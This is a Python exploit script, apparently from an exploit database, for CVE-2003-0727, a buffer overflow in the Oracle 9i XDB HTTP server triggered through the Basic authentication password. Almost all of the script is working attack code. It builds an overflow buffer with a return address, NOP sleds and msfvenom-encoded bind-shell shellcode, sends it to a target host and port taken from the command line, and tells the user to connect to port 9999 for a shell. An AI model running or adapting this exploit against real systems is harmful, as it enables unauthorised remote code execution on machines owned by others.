#Exploit Title:Oracle 9i XDB HTTP PASS Buffer Overflow
#Date: 09/25/2017
#Exploit Author: Charles Dardaman
#Twitter: https://twitter.com/CharlesDardaman
#Website: http://www.dardaman.com
#Version:9.2.0.1
#Tested on: Windows 2000 SP4
#CVE: 2003-0727
#This is a modified stand alone exploit of https://www.exploit-db.com/exploits/16809/

#!/usr/bin/python


import socket, sys, base64

#usage ./oracle9i_xbd_pass <target ip> <target port>

rhost = sys.argv[1] #target ip
rport = int(sys.argv[2]) #target port

#Variables:
ret = "\x46\x6d\x61\x60" #0x60616d46 Little endian form
nop = "\x90"
pre = "\x81\xc4\xff\xef\xff\xff\x44" #This has to be prepended into the shellcode.

#msfvenom -p windows/shell_bind_tcp lport=9999 exitfunc=thread -f py -b "\x00" -e x86/shikata_ga_nai
#355 bytes
payload =  ""
payload += pre
payload += "\xdb\xcd\xd9\x74\x24\xf4\xba\x0e\x98\xbe\xbf\x58\x29"
payload += "\xc9\xb1\x53\x31\x50\x17\x03\x50\x17\x83\xce\x9c\x5c"
payload += "\x4a\x32\x74\x22\xb5\xca\x85\x43\x3f\x2f\xb4\x43\x5b"
payload += "\x24\xe7\x73\x2f\x68\x04\xff\x7d\x98\x9f\x8d\xa9\xaf"
payload += "\x28\x3b\x8c\x9e\xa9\x10\xec\x81\x29\x6b\x21\x61\x13"
payload += "\xa4\x34\x60\x54\xd9\xb5\x30\x0d\x95\x68\xa4\x3a\xe3"
payload += "\xb0\x4f\x70\xe5\xb0\xac\xc1\x04\x90\x63\x59\x5f\x32"
payload += "\x82\x8e\xeb\x7b\x9c\xd3\xd6\x32\x17\x27\xac\xc4\xf1"
payload += "\x79\x4d\x6a\x3c\xb6\xbc\x72\x79\x71\x5f\x01\x73\x81"
payload += "\xe2\x12\x40\xfb\x38\x96\x52\x5b\xca\x00\xbe\x5d\x1f"
payload += "\xd6\x35\x51\xd4\x9c\x11\x76\xeb\x71\x2a\x82\x60\x74"
payload += "\xfc\x02\x32\x53\xd8\x4f\xe0\xfa\x79\x2a\x47\x02\x99"
payload += "\x95\x38\xa6\xd2\x38\x2c\xdb\xb9\x54\x81\xd6\x41\xa5"
payload += "\x8d\x61\x32\x97\x12\xda\xdc\x9b\xdb\xc4\x1b\xdb\xf1"
payload += "\xb1\xb3\x22\xfa\xc1\x9a\xe0\xae\x91\xb4\xc1\xce\x79"
payload += "\x44\xed\x1a\x17\x4c\x48\xf5\x0a\xb1\x2a\xa5\x8a\x19"
payload += "\xc3\xaf\x04\x46\xf3\xcf\xce\xef\x9c\x2d\xf1\x28\x52"
payload += "\xbb\x17\x5c\x7c\xed\x80\xc8\xbe\xca\x18\x6f\xc0\x38"
payload += "\x31\x07\x89\x2a\x86\x28\x0a\x79\xa0\xbe\x81\x6e\x74"
payload += "\xdf\x95\xba\xdc\x88\x02\x30\x8d\xfb\xb3\x45\x84\x6b"
payload += "\x57\xd7\x43\x6b\x1e\xc4\xdb\x3c\x77\x3a\x12\xa8\x65"
payload += "\x65\x8c\xce\x77\xf3\xf7\x4a\xac\xc0\xf6\x53\x21\x7c"
payload += "\xdd\x43\xff\x7d\x59\x37\xaf\x2b\x37\xe1\x09\x82\xf9"
payload += "\x5b\xc0\x79\x50\x0b\x95\xb1\x63\x4d\x9a\x9f\x15\xb1"
payload += "\x2b\x76\x60\xce\x84\x1e\x64\xb7\xf8\xbe\x8b\x62\xb9"
payload += "\xdf\x69\xa6\xb4\x77\x34\x23\x75\x1a\xc7\x9e\xba\x23"
payload += "\x44\x2a\x43\xd0\x54\x5f\x46\x9c\xd2\x8c\x3a\x8d\xb6"
payload += "\xb2\xe9\xae\x92"




exploit = "AAAA:" + "B"*442 + "\xeb\x64" + (nop*2) + ret + (nop*266) +"\xeb\x10" + (nop*109) + payload + (nop * (400-len(payload)))


request  = "GET / HTTP/1.1\r\n" + "Host: " + rhost + ":" + str(rport) + "\r\n" + "Authorization: Basic " + base64.b64encode(exploit) + "\r\n\r\n"

print ("Attacking " + rhost + ":" + str(rport))

#Connect to the target
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost,rport))
#Send exploit
s.send(request)
s.close()

print ("Try to connect on port 9999.")
